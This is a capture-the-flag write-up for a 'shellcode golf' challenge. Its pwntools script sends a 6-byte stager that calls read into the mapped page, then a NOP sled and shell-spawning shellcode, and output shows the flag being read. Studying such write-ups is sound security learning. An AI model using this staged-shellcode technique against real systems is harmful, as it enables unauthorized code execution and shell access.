# shellcode golf

I'll execute any shellcode you give me, but only 6 bytes of it.  I bet you can't get the flag!  
`nc challenges.tamuctf.com 5321`

(provide binary)

## Solution

In one of my proudest moments ever, I present... 6 bytes to shellcode (sorta)!

```python
from pwn import *

context.arch = 'x86_64'

initial = asm('xchg %esi,%edx;xor %edi,%edi;syscall')
payload = asm('nop') * 7 + asm(shellcraft.sh())

print("initial payload is", len(initial), "bytes")

# p = elf.debug()
p = process('./shellcode-golf')
# p = remote('35.226.243.146', 5320)

p.sendline(initial)
p.sendline(payload)

p.interactive()
```

This takes advantage of the fact that mmap actually allocates at least one page of memory: https://man7.org/linux/man-pages/man2/mmap.2.html

This is typically around 4096 bytes on x86_64 (citation needed, I just remember this number and might be wrong, but oh well). If we can read more than the 6 bytes allowed by fgets, then we can overcome the limitation.

To do this, we need to invoke the `read` syscall, with 0 in %rax and %rdi and the pointer to the region we want to overwrite in %rsi. Provided %rdx is arbitrarily larger than our shellcode, we don't actually need to worry about the length because we can simply wait for `read` to timeout.

Helpfully, %rdx already contains our target buffer (or near enough) due to the indirect call and %rax already contains 0. This gives us the following shellcode:

```asm
xchg %esi, %edx     ; shorter than mov -- this is two bytes
xor %edi, %edi      ; again, shorter because we're using the 32-bit register
syscall
```

Firing this at the target, we get:

```
initial payload is 6 bytes
[+] Opening connection to xxx.xxx.xxx.xxx on port 5321: Done
[*] Switching to interactive mode
$ cat flag.txt
gigem{m1nIm4L_5h3llc0d3_48b55e}$ 
```
